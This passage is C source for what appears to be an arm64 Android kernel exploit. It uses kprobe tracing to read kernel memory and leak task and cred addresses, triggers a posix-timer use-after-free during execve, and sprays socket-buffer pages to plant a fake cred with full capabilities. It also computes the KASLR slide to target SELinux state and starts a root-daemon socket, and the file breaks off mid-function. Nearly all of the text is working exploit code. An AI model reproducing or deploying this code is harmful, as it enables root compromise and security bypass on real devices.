#define _GNU_SOURCE 1
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/stat.h>
#include <linux/perf_event.h>
#include <linux/capability.h>
#include "ksu_symtab.h"

#define TR "/sys/kernel/tracing"
#define TRG TR "/events/kmem/rss_stat/trigger"
#define RSSEN TR "/events/kmem/rss_stat/enable"
#define MARKVAL 0x3350320250515133ULL
/* ---- t32 page-set diagnostics ---- */
#define VMEMAP_BASE 0xfffffffec0000000ULL
#define PAGE_OFFSET 0xffffff8000000000ULL
#define LEAKMAX 24000
#define DSMAX 12000
#define ALMAX 60000
static unsigned long long g_leak[LEAKMAX]; static int g_nleak;
static unsigned long long g_ds[DSMAX]; static int g_nds;
static unsigned long long g_alloc[ALMAX]; static int g_nalloc;
static unsigned long long sp_of(unsigned long long va){return VMEMAP_BASE+(((va&~0xfffULL)-PAGE_OFFSET)>>12)*0x40ULL;}
static int in_ds(unsigned long long sp){for(int i=0;i<g_nds;i++)if(g_ds[i]==sp)return 1;return 0;}

static char *tbuf; static size_t tlen;
static int wf(const char*p,const char*s){int fd=open(p,O_WRONLY|O_APPEND);if(fd<0)return -1000-errno;ssize_t w=write(fd,s,strlen(s));int r=w<0?-errno:(int)w;close(fd);return r;}
static void msleep(long ms){struct timespec ts={ms/1000,(ms%1000)*1000000L};nanosleep(&ts,0);}
static void pin(int cpu){unsigned long m=1UL<<cpu;syscall(SYS_sched_setaffinity,0,sizeof(m),&m);}
static void touch_rss(size_t len){char*p=mmap(0,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,-1,0);if(p==MAP_FAILED)return;for(size_t i=0;i<len;i+=4096)p[i]=(char)i;for(size_t i=0;i<len;i+=4096){volatile char x=p[i];(void)x;}munmap(p,len);}
static int prime_pcp(size_t pages){
 size_t len=pages*4096; char*p=mmap(0,len,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
 if(p==MAP_FAILED){printf("prime mmap fail %d\n",errno);return -1;}
 for(size_t i=0;i<len;i+=4096)p[i]=(char)(i>>12);
 for(size_t i=0;i<len;i+=4096){volatile char x=p[i];(void)x;}
 munmap(p,len); return 0;
}
static void trunc_trace(void){int fd=open(TR"/trace",O_WRONLY|O_TRUNC);if(fd>=0)close(fd);}
static size_t read_trace(char*b,size_t cap){size_t n=0;int fd=open(TR"/trace",O_RDONLY);if(fd<0)return 0;ssize_t r;while((r=read(fd,b+n,cap-n-1))>0){n+=r;if(n+65536>=cap)break;}close(fd);b[n]=0;return n;}
static void del_ev(const char*g,const char*e){
 char b[256];
 wf(TR"/tracing_on","0\n");
 snprintf(b,sizeof b,"!enable_event:%s:%s\n",g,e);wf(TRG,b);
 snprintf(b,sizeof b,"!disable_event:%s:%s\n",g,e);wf(TRG,b);
 snprintf(b,sizeof b,"disable_event:%s:%s\n",g,e);wf(TRG,b);
 wf(RSSEN,"1\n");wf(TR"/tracing_on","1\n");touch_rss(1<<20);wf(TR"/tracing_on","0\n");
 snprintf(b,sizeof b,"!disable_event:%s:%s\n",g,e);wf(TRG,b);
 snprintf(b,sizeof b,"-:%s/%s\n",g,e);wf(TR"/kprobe_events",b);
 wf(RSSEN,"0\n");
}
static int probe_on(const char*g,const char*e,const char*def){
 char b[2048];
 snprintf(b,sizeof b,"p:%s/%s %s\n",g,e,def);
 int rc=wf(TR"/kprobe_events",b);
 if(rc<=0){printf("probe %s/%s add rc=%d FAIL\n",g,e,rc);fflush(stdout);return -1;}
 snprintf(b,sizeof b,"enable_event:%s:%s\n",g,e);
 rc=wf(TRG,b);
 if(rc<=0){printf("probe %s/%s trigger rc=%d FAIL\n",g,e,rc);fflush(stdout);return -2;}
 wf(RSSEN,"1\n");wf(TR"/tracing_on","1\n");touch_rss(2<<20);wf(TR"/tracing_on","0\n");wf(RSSEN,"0\n");
 return 0;
}
static int probe_on_r(const char*g,const char*e,const char*def){
 char b[2048];
 snprintf(b,sizeof b,"r:%s/%s %s\n",g,e,def);
 int rc=wf(TR"/kprobe_events",b);
 if(rc<=0){printf("probe %s/%s add rc=%d FAIL\n",g,e,rc);fflush(stdout);return -1;}
 snprintf(b,sizeof b,"enable_event:%s:%s\n",g,e);
 rc=wf(TRG,b);
 if(rc<=0){printf("probe %s/%s trigger rc=%d FAIL\n",g,e,rc);fflush(stdout);return -2;}
 wf(RSSEN,"1\n");wf(TR"/tracing_on","1\n");touch_rss(2<<20);wf(TR"/tracing_on","0\n");wf(RSSEN,"0\n");
 return 0;
}
static unsigned long long field_u64(const char*line,const char*key){const char*p=strstr(line,key);if(!p)return 0;return strtoull(p+strlen(key),NULL,16);}
static int count_sub(const char*h,const char*n){int c=0;while((h=strstr(h,n))!=0){c++;h++;}return c;}
static void dump_matches(const char*h,const char*n,int max){const char*p=h;int c=0;while(c<max){p=strstr(p,n);if(!p)break;const char*ls=p;while(ls>h&&ls[-1]!='\n')ls--;const char*le=strchr(p,'\n');if(!le)le=p+strlen(p);char b[260];size_t L=(size_t)(le-ls);if(L>250)L=250;memcpy(b,ls,L);b[L]=0;printf("  |%s\n",b);c++;p=le;}}
static int parse_tid_comm(const char*line,int*tid,char*comm,int cap){
 const char*br=strchr(line,'[');if(!br)return -1;
 const char*p=br;while(p>line&&p[-1]==' ')p--;
 const char*d=p;while(d>line&&d[-1]>='0'&&d[-1]<='9')d--;
 if(d==p||d<=line||d[-1]!='-')return -1;
 *tid=atoi(d);
 const char*cs=line;while(*cs==' ')cs++;
 size_t n=(size_t)((d-1)-cs);if(n>=(size_t)cap)n=cap-1;
 memcpy(comm,cs,n);comm[n]=0;
 while(n>0&&comm[n-1]==' ')comm[--n]=0;
 return 0;
}
static int read_addrs(unsigned long long *addrs,unsigned long long *vals,int n){
 char def[1800];int L=snprintf(def,sizeof def,"__arm64_sys_getpid");
 for(int k=0;k<n;k++)L+=snprintf(def+L,sizeof def-L," a%d=@0x%llx:x64",k,addrs[k]);
 del_ev("t2r","r");
 if(probe_on("t2r","r",def)<0)return -1;
 trunc_trace();wf(TR"/tracing_on","1\n");syscall(SYS_getpid);wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 int got=0;char*save=0;
 for(char*line=strtok_r(tbuf,"\n",&save);line;line=strtok_r(NULL,"\n",&save)){
   if(strstr(line,"r: (")){got++;for(int k=0;k<n;k++){char key[8];snprintf(key,sizeof key,"a%d=",k);vals[k]=field_u64(line,key);}break;}
 }
 del_ev("t2r","r");
 return got;
}
static int slab_slabs(void){
 FILE*f=fopen("/proc/slabinfo","r");if(!f)return -1;
 char b[1024];int res=-1;
 while(fgets(b,sizeof b,f)){
   if(strncmp(b,"posix_timers_cache",18))continue;
   long a=0,bb=0,c=0,d=0,e=0; if(sscanf(b,"%*s %ld %ld %ld %ld %ld",&a,&bb,&c,&d,&e)<5)break;
   char*q=strstr(b,"slabdata");if(!q)break;long s1=0,s2=0;if(sscanf(q,"slabdata %ld %ld",&s1,&s2)<2)break;
   res=(int)s2;break;
 }
 fclose(f);return res;
}

/* ---------- child shared state ---------- */
static volatile int g_go=0,g_started=0,g_stop=0;
static volatile int g_exec_tid=0,g_fail=0,g_tgid=0;
static void *g_base=0;static size_t g_len=0;
static int NFILL=10000;
static int TAILN=400;
#define NFILL_MAX 20000
static timer_t g_fill[NFILL_MAX];

static int locker_fn(void *arg){int cpu=(int)(long)arg;pin(cpu);while(!g_go)sched_yield();__sync_fetch_and_add(&g_started,1);int prot=PROT_READ;while(!g_stop){prot=(prot==PROT_READ)?PROT_NONE:PROT_READ;syscall(SYS_mprotect,g_base,g_len,prot);}_exit(0);}
static int killer_fn(void *arg){(void)arg;pin(2);while(!g_exec_tid)sched_yield();int tgid=g_tgid,tid=g_exec_tid;while(1){int r=syscall(SYS_tgkill,tgid,tid,0);if(r<0&&errno==ESRCH)break;sched_yield();}syscall(SYS_tgkill,tgid,tgid,SIGKILL);g_stop=1;_exit(0);}
static void *exec_thread(void *arg){
 (void)arg;
 prctl(PR_SET_NAME,"yt-exec",0,0,0);
 { sigset_t ss; sigemptyset(&ss); sigaddset(&ss,SIGRTMIN); pthread_sigmask(SIG_BLOCK,&ss,0); }
 struct sigevent ev;memset(&ev,0,sizeof ev);ev.sigev_notify=SIGEV_SIGNAL;ev.sigev_signo=SIGRTMIN;
 timer_t t;
 if(timer_create(CLOCK_THREAD_CPUTIME_ID,&ev,&t)!=0){g_fail=1000+errno;return 0;}
 struct itimerspec its;memset(&its,0,sizeof its);its.it_value.tv_sec=3600;
 if(timer_settime(t,0,&its,NULL)!=0){g_fail=2000+errno;return 0;}
 prctl(PR_SET_NAME,"yt-execq",0,0,0);
 g_exec_tid=(int)syscall(SYS_gettid);
 g_go=1;
 while(g_started<3)sched_yield();
 for(volatile int i=0;i<5000000;i++){ }
 char *argv[]={"t2","--exec-target",0};
 char *envp[]={0};
 execve("/proc/self/exe",argv,envp);
 g_fail=3000+errno;
 return 0;
}
static void *spawn_proc(int (*fn)(void*),void *arg){
 void *st=mmap(0,1<<20,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
 if(st==MAP_FAILED)return 0;
 void *top=(char*)st+(1<<20);
 long p=syscall(SYS_clone,(unsigned long)(CLONE_VM|SIGCHLD),top,0,0,0);
 if(p<0)return 0;
 if(p==0){int r=fn(arg);_exit(r);}
 return (void*)1;
}
static int prepare_fragmented_range(void){
 g_len=(size_t)50000*4096;
 int fd=(int)syscall(SYS_memfd_create,"vma-page",1);
 if(fd<0){printf("memfd fail %d\n",errno);return -1;}
 if(ftruncate(fd,4096)<0){printf("ftruncate fail %d\n",errno);return -2;}
 void*base=mmap(0,g_len,PROT_NONE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
 if(base==MAP_FAILED){printf("mmap range fail %d\n",errno);return -3;}
 for(size_t i=0;i<50000;i++){
   void*p=mmap((char*)base+i*4096,4096,PROT_READ,MAP_SHARED|MAP_FIXED,fd,0);
   if(p==MAP_FAILED){printf("mmap sub fail i=%zu e=%d\n",i,errno);return -4;}
 }
 close(fd);g_base=base;return 0;
}
static void *tail_filler(void *arg){
 (void)arg; pin(5);
 while(!g_exec_tid)sched_yield();
 for(int i=0;i<TAILN;i++){
  struct sigevent ev;memset(&ev,0,sizeof ev);ev.sigev_notify=SIGEV_NONE;
  timer_t t;timer_create(CLOCK_MONOTONIC,&ev,&t);
 }
 for(;;)sched_yield();
 return 0;
}
static void child_main(void){
 setpgid(0,0);
 pin(0);
 prctl(PR_SET_NAME,"yt2-child",0,0,0);
 g_tgid=(int)getpid();
 printf("child pid=%d nfill=%d\n",g_tgid,NFILL);fflush(stdout);
 for(int i=0;i<NFILL;i++){
   struct sigevent ev;memset(&ev,0,sizeof ev);ev.sigev_notify=SIGEV_NONE;
   if(timer_create(CLOCK_MONOTONIC,&ev,&g_fill[i])!=0){printf("filler fail i=%d e=%d\n",i,errno);fflush(stdout);break;}
 }
 if(prepare_fragmented_range()<0)_exit(9);
 static int cpus[3]={1,3,3};
 for(int i=0;i<3;i++){ if(!spawn_proc(locker_fn,(void*)(long)cpus[i])){printf("spawn locker fail\n");_exit(8);} }
 if(!spawn_proc(killer_fn,0)){printf("spawn killer fail\n");_exit(7);}
 { pthread_t tth; if(pthread_create(&tth,0,tail_filler,0)!=0){printf("tail pthread fail e=%d\n",errno);} }
 pthread_t th;
 if(pthread_create(&th,0,exec_thread,0)!=0){printf("pthread fail\n");_exit(6);}
 for(;;)sched_yield();
}

/* ---------- 8KB order-1 skb page spray engine ---------- */
static unsigned long long A,TASK,PTASK,N,PAGE,S,MARK;
static unsigned long long off,mk;
static unsigned char pat[8192];
#define MAXPAIR 20000
static int sv[MAXPAIR][2]; static int nsv=0; static long ppages=0;
static int g_pairs=8192,g_delay=0,g_mode=0,g_att=3,g_reps=1,g_churn=0,g_chwait=500;
#define FSMAX 200000
static unsigned long long g_fs[FSMAX];static int g_nfs=0;
static unsigned long long g_fakekva;
static int g_stage=0,g_ntg=0,g_selmode=1;
static void build_pattern(void){
  memset(pat,0,sizeof pat);
  { unsigned long long v=MARKVAL; memcpy(pat+mk,&v,8); }
  { unsigned long long v=(g_selmode&&g_stage==0)?(g_fakekva|0x100ULL):g_fakekva; memcpy(pat+off+0xe0,&v,8); }
  { unsigned long long v=0; memcpy(pat+off+0xe8,&v,8); }
  memcpy(pat+off+0xf0,&S,8);
}
static int precreate_pairs(int n){
  nsv=0;ppages=0;
  for(int i=0;i<n&&i<MAXPAIR;i++){
    if(socketpair(AF_UNIX,SOCK_STREAM,0,sv[nsv])!=0){printf("socketpair fail e=%d\n",errno);break;}
    nsv++;
  }
  return nsv;
}
static int send_all(void){
  int nok=0;
  for(int i=0;i<nsv;i++){
    ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);
    if(w==7872){nok++;ppages++;}
  }
  return nok;
}
#define SPMAXC 10
static int g_sp_lo[SPMAXC],g_sp_n[SPMAXC];
static void *spray_thread(void*arg){
 long c=(long)arg;pin((int)c);
 int lo=g_sp_lo[c],n=g_sp_n[c];
 for(int i=lo;i<lo+n&&i<nsv;i++){ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);if(w==7872)__sync_fetch_and_add(&ppages,1);}
 return 0;}
static void spray_cpus(int base,int cnt){
 int nc=(int)sysconf(_SC_NPROCESSORS_ONLN);if(nc>SPMAXC)nc=SPMAXC;if(nc<1)nc=1;
 pthread_t th[SPMAXC];for(int c=0;c<SPMAXC;c++)th[c]=0;
 for(int c=0;c<nc;c++){int lo=base+(int)((long)cnt*c/nc),hi=base+(int)((long)cnt*(c+1)/nc);
  g_sp_lo[c]=lo;g_sp_n[c]=hi-lo;
  if(pthread_create(&th[c],0,spray_thread,(void*)(long)c)!=0)th[c]=0;}
 for(int c=0;c<nc;c++)if(th[c])pthread_join(th[c],0);}
static void spray_one(void){for(int i=0;i<nsv;i++){ssize_t w=send(sv[i][0],pat,7872,MSG_DONTWAIT);if(w==7872)__sync_fetch_and_add(&ppages,1);}}
static void close_skb(void){for(int i=0;i<nsv;i++){close(sv[i][0]);close(sv[i][1]);}nsv=0;ppages=0;}
static int detect_hit(void){
  unsigned long long ad[8],vv[8];int n=0;
  ad[n++]=MARK;ad[n++]=PAGE+off+0xe0;ad[n++]=PAGE+off+0xf0;
  ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=PAGE+off+0xf8;
  int g=read_addrs(ad,vv,n);
  if(g<=0)return 0;
  if(vv[0]!=MARKVAL)return 0;
  for(int k=0;k<n;k++)printf("  D[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
  { unsigned long long ex=(g_selmode&&g_stage==0)?(g_fakekva|0x100ULL):g_fakekva; if(vv[1]!=ex||vv[2]!=S)printf("  WARN node mismatch\n"); }
  return 1;
}
static void drain_all_pcp(void){
  for(int cpu=0;cpu<10;cpu++){pin(cpu);prime_pcp(2048);}
  pin(0);msleep(100);
}
static int slab_named(const char*name){
  FILE*f=fopen("/proc/slabinfo","r"); if(!f)return -1;
  char b[1024]; int res=-1; size_t L=strlen(name);
  while(fgets(b,sizeof b,f)){
    if(strncmp(b,name,L))continue;
    char*q=strstr(b,"slabdata");if(!q)break;long s1=0,s2=0;if(sscanf(q,"slabdata %ld %ld",&s1,&s2)<2)break;
    res=(int)s2;break;
  }
  fclose(f);return res;
}
static void benign_cleanup(pid_t pid,int zombie){
  if(zombie){printf("benign reap\n");fflush(stdout);waitpid(pid,0,0);}
  kill(-pid,SIGKILL);kill(pid,SIGKILL);msleep(80);
  while(waitpid(-1,0,WNOHANG)>0){}
}
static void unpin0(void){cpu_set_t cs;CPU_ZERO(&cs);for(int i=0;i<16;i++)CPU_SET(i,&cs);sched_setaffinity(0,sizeof cs,&cs);}
static pid_t g_me;
#define INIT_USER_NS_STATIC 0xffffffc0826d10d8ULL
#define SELINUX_STATE_STATIC 0xffffffc082959630ULL
static unsigned long long g_cred=0,g_tg[4]={0,0,0,0};
static unsigned long long g_un=0,g_sel=0;
#define FULL_CAP_MASK 0x1ffffffffffULL
static int g_pfd=-1; static void *g_pmap=0; static unsigned long long g_fakekva=0;
static unsigned long long g_sec=0,g_usr=0,g_uc=0,g_gi=0;
static unsigned long long g_secw[3]={0,0,0}; static int g_sec_ok=0;
static int g_armed=0; static char g_self[256]={0};

static void set_secptr(unsigned long long *q){
 if(getenv("O3P_SIDFORGE")){unsigned long long *t=(unsigned long long*)((char*)g_pmap+0x800);
  t[0]=0x0000000100000001ULL;t[1]=0;t[2]=0;
  q[0x80/8]=g_fakekva+0x800;
 } else q[0x80/8]=g_sec;
}
static void fill_fake_cred(unsigned long long naddr){
 if(!g_pmap)return;
 memset(g_pmap,0,4096);
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=g_fakekva; q[1]=0; q[2]=naddr; q[3]=0;
  if(g_selmode&&g_stage==0){q[0x108/8]=naddr;q[0x110/8]=naddr;}
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 set_secptr(q);q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}
static void repair_fake_cred(void){
 if(!g_pmap)return;
 unsigned long long *q=(unsigned long long*)g_pmap;
 q[0]=0x100000; q[1]=0; q[2]=0; q[3]=0; q[4]=0;
 q[6]=FULL_CAP_MASK;q[7]=FULL_CAP_MASK;q[8]=FULL_CAP_MASK;q[9]=FULL_CAP_MASK;q[10]=FULL_CAP_MASK;
 set_secptr(q);q[0x88/8]=g_usr;q[0x90/8]=(g_un?g_un:INIT_USER_NS_STATIC);q[0x98/8]=g_uc;q[0xa0/8]=g_gi;
}


/* ---------- attempt: UAF trigger + 8K victim page reclaim ---------- */
static int do_attempt(int att, pid_t *outpid){
 A=TASK=PTASK=0; close_skb(); int slabs0=slab_slabs();
 printf("== attempt %d slabs0=%d\n",att,slabs0);fflush(stdout);
 unpin0();
 {int np=precreate_pairs(g_pairs);printf("pairs=%d\n",np);fflush(stdout);}
 trunc_trace();wf(TR"/tracing_on","1\n");
 prctl(PR_SET_NAME,"yt2-parent",0,0,0);
 g_me=getpid();g_nleak=0;g_nalloc=0;
 pid_t pid=fork();
 if(pid==0){child_main();_exit(0);}
 if(pid<0){printf("fork fail %d\n",errno);wf(TR"/tracing_on","0\n");return 1;}
  siginfo_t si;int zombie=0;
  memset(&si,0,sizeof si);
  {int r=waitid(P_PID,pid,&si,WEXITED|WNOWAIT);
   if(r==0&&si.si_pid==pid)zombie=1;}
 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("zombie=%d trace=%zu\n",zombie,tlen);fflush(stdout);
 printf("DBG x=%d tm=%d fr=%d ei=%d rl=%d td=%d pe=%d\n",count_sub(tbuf," x: ("),count_sub(tbuf," tm: ("),count_sub(tbuf," fr: ("),count_sub(tbuf," ei: ("),count_sub(tbuf," rl: ("),count_sub(tbuf," td: ("),count_sub(tbuf," pe: ("));
 dump_matches(tbuf," x: (",3);
 int etid=0;
 {char*save=0;
  for(char*line=strtok_r(tbuf,"\n",&save);line;line=strtok_r(NULL,"\n",&save)){
   int tid=0;char comm[32];
   if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
   if(strstr(line," fs: (")){unsigned long long sv=field_u64(line,"slab=");if(sv&&g_nfs<FSMAX)g_fs[g_nfs++]=sv;}
    if(strstr(line," tm: (")){unsigned long long v=field_u64(line,"a0=");if(v&&g_nleak<LEAKMAX)g_leak[g_nleak++]=(v|0xffffff0000000000ULL);}
    if(strstr(line,"x: (")){
     unsigned long long ts=field_u64(line,"ts="),h=field_u64(line,"h=");
     if(h&&!A&&!strncmp(comm,"yt-exec",7)){A=h-0xe0;TASK=ts;etid=tid;}
     if(ts&&tid==(int)g_me)PTASK=ts;
   }
  }}
 if(!A||!TASK||!PTASK){printf("VERDICT NO_UAF_TRIGGER\n");benign_cleanup(pid,zombie);return 1;}
 printf("A=0x%llx TASK=0x%llx PTASK=0x%llx etid=%d\n",A,TASK,PTASK,etid);fflush(stdout);
 PAGE=A&~0x1fffULL;off=A&0x1fffULL;N=A+0xe0;
 int k=(int)(off/0x180);
 printf("PAGE=0x%llx off=0x%llx k=%d N=0x%llx\n",PAGE,off,k,N); if(!g_cred){
  unsigned long long ad2[12],vv2[12];int g2=0;
  ad2[0]=PTASK+0x908;g2=read_addrs(ad2,vv2,1);
  if(g2>0&&vv2[0]){g_cred=vv2[0];
   ad2[0]=g_cred+0x00;ad2[1]=g_cred+0x08;ad2[2]=g_cred+0x18;ad2[3]=g_cred+0x20;ad2[4]=g_cred+0x80;ad2[5]=g_cred+0x28;ad2[6]=g_cred+0x90;ad2[7]=g_cred+0x88;ad2[8]=g_cred+0x98;ad2[9]=g_cred+0xa0;
   g2=read_addrs(ad2,vv2,10);
   printf("CRED cred=0x%llx usage=%llu uid=%llu euid=%llu fsuid=%llu sec=0x%llx sb=0x%llx un=0x%llx user=0x%llx uc=0x%llx gi=0x%llx\n",g_cred,vv2[0],vv2[1],vv2[2],vv2[3],vv2[4],vv2[5],vv2[6],vv2[7],vv2[8],vv2[9]);fflush(stdout);
   g_un=vv2[6];g_sec=vv2[4];g_usr=vv2[7];g_uc=vv2[8];g_gi=vv2[9];
   if(getenv("O3P_SIDFORGE")){unsigned long long sa[3],sv[3];sa[0]=g_sec;sa[1]=g_sec+8;sa[2]=g_sec+0x10;int sg=read_addrs(sa,sv,3);
    if(sg>0){g_secw[0]=sv[0];g_secw[1]=sv[1];g_secw[2]=sv[2];g_sec_ok=1;}
    printf("SECBLOB got=%d w0=0x%llx w1=0x%llx w2=0x%llx\n",sg,sv[0],sv[1],sv[2]);fflush(stdout);}
   if(g_un){unsigned long long sl=g_un-INIT_USER_NS_STATIC;int algn=(int)((sl&0x1fffffULL)==0);
     printf("SLIDE_CALC un=0x%llx slide=0x%llx align=%d\n",g_un,sl,algn);fflush(stdout);}
  } else {printf("CRED_LEAK_FAIL g=%d\n",g2);fflush(stdout);}
 }

 if(!g_fakekva){printf("VERDICT NO_FAKEPAGE\n");benign_cleanup(pid,zombie);return 1;}
 if(k>19||off+0x110ULL>0x1ec0ULL){printf("VERDICT BAD_OFFSET\n");benign_cleanup(pid,zombie);return 1;}
  {int nv=0,nld=0;unsigned long long spv=sp_of(PAGE);
   char*seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
   for(int i=0;i<g_nfs;i++){unsigned long long sp=g_fs[i];if(sp==spv)nv++;
     for(int j=0;j<g_nleak&&j<LEAKMAX;j++){if(!seen[j]&&sp_of(g_leak[j])==sp){seen[j]=1;nld++;break;}}}
   free(seen);
   printf("W1FS fs=%d victim=%d leakpages=%d nleak=%d\n",g_nfs,nv,nld,g_nleak);fflush(stdout);}
   if(g_churn>0){
   pin(0);
   printf("CHURN start slabs=%d n=%d\n",slab_slabs(),g_churn);fflush(stdout);
   timer_t *chtt=(timer_t*)malloc(sizeof(timer_t)*(size_t)g_churn);
   int ncc=0;
   if(chtt){struct sigevent chse;memset(&chse,0,sizeof chse);chse.sigev_notify=SIGEV_NONE;
   for(int ci=0;ci<g_churn;ci++){if(timer_create(CLOCK_MONOTONIC,&chse,&chtt[ci])==0)ncc++;}
   printf("CHURN created=%d slabs=%d\n",ncc,slab_slabs());fflush(stdout);
   for(int ci=0;ci<ncc;ci++)timer_delete(chtt[ci]);
   free(chtt);}
   printf("CHURN deleted slabs=%d\n",slab_slabs());fflush(stdout);
   msleep(g_chwait);
   printf("CHURN afterwait slabs=%d\n",slab_slabs());fflush(stdout);
 }
  mk=0x1a00ULL;MARK=PAGE+mk;
  if(g_selmode&&g_stage==0){ if(!g_un){printf("VERDICT NO_SLIDE\n");benign_cleanup(pid,zombie);return 1;} g_sel=SELINUX_STATE_STATIC+(g_un-INIT_USER_NS_STATIC); S=g_sel; } else S=PTASK+0x908;
printf("FAKEPAGE kva=0x%llx MARK=0x%llx S=0x%llx stage=%d\n",g_fakekva,MARK,S,g_stage);fflush(stdout);
 fill_fake_cred(N);
 build_pattern();
  int hit=0;
  printf("km8k_before=%d posix_before=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  printf("DBG3 leaks=%d delay=%d mode=%d pairs=%d\n",g_nleak,g_delay,g_mode,g_pairs);fflush(stdout);
  probe_on_r("o3p","al","__alloc_frozen_pages_noprof page=$retval:x64");
  printf("cpu_before=%d\n",sched_getcpu());fflush(stdout);
  probe_on("o3p","fs","free_slab cache=%x0:x64 slab=%x1:x64");
  {trunc_trace();wf(TR"/tracing_on","1\n");msleep(g_delay);wf(TR"/tracing_on","0\n");
   size_t tf=read_trace(tbuf,48u<<20);
   {char*s3=0;int nfs=0,nl=0,nv=0;unsigned long long spv0=sp_of(PAGE);
    char *seen=malloc(LEAKMAX);memset(seen,0,LEAKMAX);
    for(char*line=strtok_r(tbuf,"\n",&s3);line;line=strtok_r(NULL,"\n",&s3)){
      if(strstr(line," fs: (")){unsigned long long sp=field_u64(line,"slab=");if(!sp)continue;nfs++;
        if(sp==spv0)nv++;
        for(int i=0;i<g_nleak&&i<LEAKMAX;i++){if(!seen[i]&&sp_of(g_leak[i])==sp){seen[i]=1;nl++;break;}}
      }
    }
    printf("FREESLAB nfs=%d leakpages=%d victim_fs=%d bytes=%zu\n",nfs,nl,nv,tf);fflush(stdout);
    free(seen);}
  }
  {printf("cpu_after=%d\n",sched_getcpu());fflush(stdout);
   g_nalloc=0;
   trunc_trace();wf(TR"/tracing_on","1\n");
   for(int rp=0;rp<g_reps;rp++){if(g_mode==0)spray_one();else spray_cpus(0,nsv);}
   wf(TR"/tracing_on","0\n");
   size_t tl=read_trace(tbuf,48u<<20);
   {char*s2=0;for(char*line=strtok_r(tbuf,"\n",&s2);line;line=strtok_r(NULL,"\n",&s2)){
      int tid=0;char comm[32];
      if(parse_tid_comm(line,&tid,comm,sizeof comm)<0)continue;
      if(strncmp(comm,"yt2-parent",10))continue;
      if(strstr(line," al: (")){unsigned long long v=field_u64(line,"page=");if(v&&g_nalloc<ALMAX)g_alloc[g_nalloc++]=v;}
   }}
   printf("BURST sent=%d alloc=%d bytes=%zu\n",nsv,g_nalloc,tl);fflush(stdout);
   hit=detect_hit();
   {int lim=g_nleak<512?g_nleak:512;int vm=0,lm=0;unsigned long long spv=sp_of(A);
    for(int j=0;j<g_nalloc;j++){
      if(g_alloc[j]==spv)vm++;
      for(int i=0;i<lim;i++){if(g_alloc[j]==sp_of(g_leak[i])){lm++;break;}}
    }
    printf("ALLOCSTAT ours=%d victim_match=%d leak_match=%d leak_sample=%d\n",g_nalloc,vm,lm,lim);fflush(stdout);}
  }
  printf("km8k_after=%d posix_after=%d\n",slab_named("kmalloc-8k"),slab_named("posix_timers_cache"));fflush(stdout);
  int hit2=hit;(void)hit2;
  if(hit)printf("HIT pages=%ld\n",ppages);
  else printf("miss pages=%ld\n",ppages);fflush(stdout);
 { unsigned long long ad[3],vv[3];int n=0;ad[n++]=TASK+0x8a0;ad[n++]=TASK+0x8a8;ad[n++]=A+0x100;
   int g=read_addrs(ad,vv,n);
   if(g>0){printf("post rb_node=0x%llx next=0x%llx n100=0x%llx\n",vv[0],vv[1],vv[2]);
     if(vv[1]!=N){printf("VERDICT NO_STALE_LINK\n");benign_cleanup(pid,zombie);return 1;}}
   else printf("post read got=%d\n",g); }
  { unsigned long long ad[10],vv[10];int n=0;
    ad[n++]=PAGE;ad[n++]=PAGE+0x100;ad[n++]=PAGE+0x400;ad[n++]=PAGE+0x800;ad[n++]=PAGE+0x1000;ad[n++]=PAGE+0x1800;ad[n++]=PAGE+0x1a00;ad[n++]=PAGE+0x1c00;ad[n++]=A;ad[n++]=A+0x38;
    int g=read_addrs(ad,vv,n);printf("page dump got=%d\n",g);
    if(g>0)for(int k=0;k<n;k++)printf("  D[%d] +0x%llx = 0x%llx\n",k,ad[k]-PAGE,vv[k]);
    printf("SP=0x%llx\n",(0xfffffffec0000000ULL+(((PAGE-0xffffff8000000000ULL)>>12)*0x40ULL)));fflush(stdout);}
 if(!hit){printf("VERDICT NO_RECLAIM\n");benign_cleanup(pid,zombie);return 1;}
 printf("FAKE_TREE_ARMED att=%d pages=%ld\n",att,ppages);fflush(stdout);
 *outpid=pid;return 0;
}
/* ---------- reap: trigger stale-node zero write, verify ---------- */
#define ROOTD_SOCK "o3p_rootd"
static void run_sh(const char*cmd,const char*outpath,int waitms){
 pid_t c=fork();
 if(c==0){int fd=open(outpath,O_WRONLY|O_CREAT|O_TRUNC,0666);if(fd>=0){dup2(fd,1);dup2(fd,2);close(fd);}
   execl("/system/bin/sh","sh","-c",cmd,(char*)0);_exit(127);}
 if(c>0){for(int i=0;i<waitms/50;i++){int st;pid_t r=waitpid(c,&st,WNOHANG);if(r==c)break;msleep(50);}}
}
static void read_file_print(const char*path,const char*tag){
 char b[4096];int n=0;int fd=open(path,O_RDONLY);if(fd>=0){n=(int)read(fd,b,sizeof b-1);close(fd);}if(n<0)n=0;b[n]=0;
 printf("%s:[%s]\n",tag,b);fflush(stdout);
}
static int rootd_bind(void){
 int fd=socket(AF_UNIX,SOCK_STREAM,0);
 if(fd<0)return -1;
